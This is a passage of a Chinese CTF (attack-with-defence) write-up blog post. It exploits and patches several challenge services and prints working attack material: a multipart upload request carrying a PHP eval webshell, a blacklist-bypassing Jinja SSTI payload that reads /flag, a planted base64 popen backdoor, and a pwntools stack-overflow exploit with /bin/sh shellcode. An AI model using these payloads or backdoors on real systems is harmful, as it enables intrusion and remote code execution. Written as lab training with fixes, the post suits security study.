class="keyword">var</span> $defineTypeList=<span class="string">"jpg|jpeg|gif|png|php"</span>;<span class="comment">//string jpg|gif|bmp  ...</span></span><br><span class="line"><span class="keyword">var</span> $filePrefix= <span class="string">""</span>;</span><br><span class="line"><span class="keyword">var</span>  $changNameMode=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> $uploadFile;</span><br><span class="line"><span class="keyword">var</span> $newFileName;</span><br><span class="line"><span class="keyword">var</span> $error;</span><br></pre></td></tr></table></figure></p>
+<p>发现默认竟然可以上传php！那么直接上传php马即可，文件路径会显示在头像路径那里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/?r=manageinfo HTTP/1.1</span><br><span class="line">Host: www.kira.com</span><br><span class="line">Content-Length: 896</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://www.kira.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://www.kira.com/admin/?r=manageinfo</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8</span><br><span class="line">Cookie: PHPSESSID=553efd0695ddb859599983f05171102b; user=admin</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;user&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;password2&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail&quot;</span><br><span class="line"></span><br><span class="line">me@baidu.so</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;qq&quot;</span><br><span class="line"></span><br><span class="line">86226999</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;images&quot;; filename=&quot;123.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[c]);?&gt;</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF--</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221521-be7571ce-ded5-1.png" alt="image.png"></p>
+<h3 id="漏洞三修复"><a href="#漏洞三修复" class="headerlink" title="漏洞三修复"></a>漏洞三修复</h3><p>修改<code>/inc/up.class.php</code>处的代码，删除<code>$defineTypeList</code>中的php，不允许上传php。</p>
+<h2 id="web2-python"><a href="#web2-python" class="headerlink" title="web2 python"></a>web2 python</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221533-c5772cba-ded5-1.png" alt="image.png"></p>
+<p>第二个web是一个flask写的blog</p>
+<h3 id="漏洞一-SSTI"><a href="#漏洞一-SSTI" class="headerlink" title="漏洞一 SSTI"></a>漏洞一 SSTI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        blacklist = [<span class="string">'import'</span>,<span class="string">'getattr'</span>,<span class="string">'os'</span>,<span class="string">'class'</span>,<span class="string">'subclasses'</span>,<span class="string">'mro'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'eval'</span>,<span class="string">'if'</span>,<span class="string">'for'</span>,<span class="string">' subprocess'</span>,<span class="string">'file'</span>,<span class="string">'open'</span>,<span class="string">'popen'</span>,<span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'item'</span>,<span class="string">'getitem'</span>,<span class="string">'getattribute'</span>,<span class="string">'func_globals'</span>]</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">                    s =s.replace(no,<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        a =  [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> a])+s</span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">    &#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">        &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">    '''</span> % (request.url)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(safe_jinja(template)), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+<p>查看<code>app.py</code>，可以找到一个常见的SSTI漏洞，触发点是404，简单测试一下，发现确实可以模板注入。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221546-cd086480-ded5-1.png" alt="image.png"></p>
+<p>代码自带了黑名单过滤，查用循环替换为空的过滤方式，浏览一下发现过滤不全，下划线，中括号，<code>init</code>，<code>globals</code>等关键字没有过滤，部分关键字可以使用字符串拼接的方式进行绕过。</p>
+<p>最终读取flag的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/login/&#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__base__.__base__.__base__[&apos;__subcla&apos;+&apos;sses__&apos;]()[163].__init__.__globals__[&apos;__bui&apos;+&apos;ltins__&apos;][&apos;op&apos;+&apos;en&apos;](&apos;/flag&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221556-d2fd6818-ded5-1.png" alt="image.png"></p>
+<h3 id="漏洞一-修复方法"><a href="#漏洞一-修复方法" class="headerlink" title="漏洞一 修复方法"></a>漏洞一 修复方法</h3><p>原题已经提供了过滤的函数，直接增加过滤关键字就可以进行修复，例如直接把下划线加入黑名单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">'_'</span>,<span class="string">'import'</span>,<span class="string">'getattr'</span>,<span class="string">'os'</span>,<span class="string">'class'</span>,<span class="string">'subclasses'</span>,<span class="string">'mro'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'eval'</span>,<span class="string">'if'</span>,<span class="string">'for'</span>,<span class="string">' subprocess'</span>,<span class="string">'file'</span>,<span class="string">'open'</span>,<span class="string">'popen'</span>,<span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'item'</span>,<span class="string">'getitem'</span>,<span class="string">'getattribute'</span>,<span class="string">'func_globals'</span>]</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞二-预置后门"><a href="#漏洞二-预置后门" class="headerlink" title="漏洞二 预置后门"></a>漏洞二 预置后门</h3><p>查看blog编辑器的代码<code>flask_blogging/views.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editor</span><span class="params">(post_id)</span>:</span></span><br><span class="line">    blogging_engine = _get_blogging_engine(current_app)</span><br><span class="line">    cache = blogging_engine.cache</span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        _clear_cache(cache)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> blogging_engine.blogger_permission.require():</span><br><span class="line">            post_processor = blogging_engine.post_processor</span><br><span class="line">            config = blogging_engine.config</span><br><span class="line">            storage = blogging_engine.storage</span><br><span class="line">            <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">                form = BlogEditor(request.form)</span><br><span class="line">                <span class="keyword">if</span> form.validate():</span><br><span class="line">                    post = storage.get_post_by_id(post_id)</span><br><span class="line">                    <span class="keyword">if</span> (post <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>) <span class="keyword">and</span> \</span><br><span class="line">                            (PostProcessor.is_author(post, current_user)) <span class="keyword">and</span> \</span><br><span class="line">                            (str(post[<span class="string">"post_id"</span>]) == post_id):</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        post = &#123;&#125;</span><br><span class="line">                    escape_text = config.get(<span class="string">"BLOGGING_ESCAPE_MARKDOWN"</span>, <span class="keyword">False</span>)</span><br><span class="line">                    pid = _store_form_data(form, storage, current_user, post,</span><br><span class="line">                                           escape_text)</span><br><span class="line">                    editor_post_saved.send(blogging_engine.app,</span><br><span class="line">                                           engine=blogging_engine,</span><br><span class="line">                                           post_id=pid,</span><br><span class="line">                                           user=current_user,</span><br><span class="line">                                           post=post)</span><br><span class="line">                    flash(<span class="string">"Blog posted successfully!"</span>, <span class="string">"info"</span>)</span><br><span class="line">                    slug = post_processor.create_slug(form.title.data)</span><br><span class="line">                    <span class="keyword">return</span> redirect(url_for(<span class="string">"blogging.page_by_id"</span>, post_id=pid,</span><br><span class="line">                                            slug=slug))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flash(<span class="string">"There were errors in blog submission"</span>, <span class="string">"warning"</span>)</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">"blogging/editor.html"</span>, form=form,</span><br><span class="line">                                           post_id=post_id, config=config)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> post_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                    post = storage.get_post_by_id(post_id)</span><br><span class="line">                    <span class="keyword">if</span> (post <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>) <span class="keyword">and</span> \</span><br><span class="line">                            (PostProcessor.is_author(post, current_user)):</span><br><span class="line">                        tags = <span class="string">" "</span>.join(post[<span class="string">"tags"</span>])</span><br><span class="line">                        form = BlogEditor(title=post[<span class="string">"title"</span>],</span><br><span class="line">                                          text=post[<span class="string">"text"</span>], tags=tags, public=post[<span class="string">'public'</span>])</span><br><span class="line">                        editor_get_fetched.send(blogging_engine.app,</span><br><span class="line">                                                engine=blogging_engine,</span><br><span class="line">                                                post_id=post_id,</span><br><span class="line">                                                form=form)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">"blogging/editor.html"</span>,</span><br><span class="line">                                               form=form, post_id=post_id,</span><br><span class="line">                                               config=config)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        flash(<span class="string">"You do not have the rights to edit this post"</span>,</span><br><span class="line">                              <span class="string">"warning"</span>)</span><br><span class="line">                        <span class="keyword">return</span> redirect(url_for(<span class="string">"blogging.index"</span>,</span><br><span class="line">                                                post_id=<span class="keyword">None</span>))</span><br><span class="line"></span><br><span class="line">            form = BlogEditor()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                bingo = popen(<span class="string">'echo Y2F0IC9mbGFnCg==|base64 -d|bash'</span>).read()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                bingo = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"blogging/editor.html"</span>, form=form,</span><br><span class="line">                                   post_id=post_id, config=config, bingo=bingo)</span><br><span class="line">    <span class="keyword">except</span> PermissionDenied:</span><br><span class="line">        flash(<span class="string">"You do not have permissions to create or edit posts"</span>, <span class="string">"warning"</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"blogging.index"</span>, post_id=<span class="keyword">None</span>))</span><br></pre></td></tr></table></figure></p>
+<p>留意到这个函数有一句<code>bingo = popen(&#39;echo Y2F0IC9mbGFnCg==|base64 -d|bash&#39;).read()</code>，进行了命令执行，base64解码可以看到执行了<code>cat /flag</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> echo Y2F0IC9mbGFnCg==|base64 -d</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>
+<p>函数开头有<code>@login_required</code>装饰器，因此需要进行登陆。</p>
+<p>根据数据库的代码，可以找到数据库文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///data/ezBlog.db'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model, UserMixin)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'user'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">32</span>), unique=<span class="keyword">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">64</span>), unique=<span class="keyword">True</span>)</span><br><span class="line">    <span class="comment">#posts = blog_db.relationship(, backref = , lazy = ) ## posts blongs to cur user</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br></pre></td></tr></table></figure></p>
+<p>使用sqlite studio查看数据库，可以看到默认的账号密码</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221609-db3c5106-ded5-1.png" alt="image.png"></p>
+<p>使用test，test登陆后，在blog编辑界面就可以看到flag</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221616-def1e626-ded5-1.png" alt="image.png"></p>
+<h3 id="漏洞二-修复方法"><a href="#漏洞二-修复方法" class="headerlink" title="漏洞二 修复方法"></a>漏洞二 修复方法</h3><p>方法一：直接把命令执行的代码删除或者改掉</p>
+<p>方法二：修改后台弱口令</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/za/qwb&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>题目什么保护都没开，可见难度不会太大。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  int v5; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v7; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v8; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v9; // [rsp+28h] [rbp-18h]</span><br><span class="line">  __int16 v10; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned int v11; // [rsp+38h] [rbp-8h]</span><br><span class="line">  int v12; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  v8 = 0LL;</span><br><span class="line">  v9 = 0LL;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  alarm(0x14u);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  v3 = stdin;</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  menu(v3, 0LL);</span><br><span class="line">  while ( v12 &lt;= 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = 0;</span><br><span class="line">    puts(&quot;Enter your choice:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">    switch ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        magic(&amp;buf, v11); // 地址泄露</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        puts(&quot;What?&quot;);</span><br><span class="line">        read(0, &amp;buf, 0x40uLL); // 栈溢出</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        what(); // 没用的</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v12;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall magic(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == 0x12345678 )</span><br><span class="line">    result = printf(&quot;It is magic: [%p]?\n&quot;, a1);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数功能不多，漏洞很明显：</p>
+<ol>
+<li>magic函数可以泄露栈地址，前提是v11是0x12345678。</li>
+<li>case 3可以进行栈溢出，刚好能覆盖到返回地址。</li>
+</ol>
+<p>那么思路就是：</p>
+<ol>
+<li>溢出覆盖v11为0x12345678，然后进行magic函数获取buff地址。</li>
+<li>将shellcode写入buff，然后栈溢出覆盖返回地址为buff地址。</li>
+</ol>
+<p>buf有0x38的长度供写入shellcode，卓卓有余，网上可以找22字节左右的shellcode，当然也可以自己写。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.send(p64(<span class="number">0x12345678</span>)*<span class="number">6</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    addr = int(p.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    success(hex(addr)) <span class="comment"># 0x7f09b7083000 0x7ffe28596f00</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">    <span class="keyword">print</span> len(shellcode)</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)+p64(addr)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>getshell的关键点是栈溢出，因此只要把输入长度限制到0x30，漏洞就无法利用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040086B                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000040086F                 mov     edx, 30h        ; nbytes</span><br><span class="line">.text:0000000000400874                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400877                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040087C                 call    _read</span><br></pre></td></tr></table></figure>
+<p>题目没有设置更高级的漏洞，略显无趣。</p>
+<p>比较过分的是，有队伍进行了提权，然后把flag删除了，只能在flag刷新的时候疯狂跑EXP，有机会在对方删flag前拿到。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://4f-kira.github.io">kira</a>
+            <p>原文链接：<a href="https://4f-kira.github.io/2019/10/10/gdqwb-awd-writeup/">https://4f-kira.github.io/2019/10/10/gdqwb-awd-writeup/</a>
+            <p>发表日期：<a href="https://4f-kira.github.io/2019/10/10/gdqwb-awd-writeup/">October 10th 2019, 6:54:50 pm</a>
+            <p>更新日期：<a href="https://4f-kira.github.io/2019/10/10/gdqwb-awd-writeup/">October 10th 2019, 7:01:33 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/09/05/jtwlb-ctf/" title= "JTWLB-CTF-Writeup">
+                    <div class="prevTitle">JTWLB-CTF-Writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:304822113@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/4f-kira" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
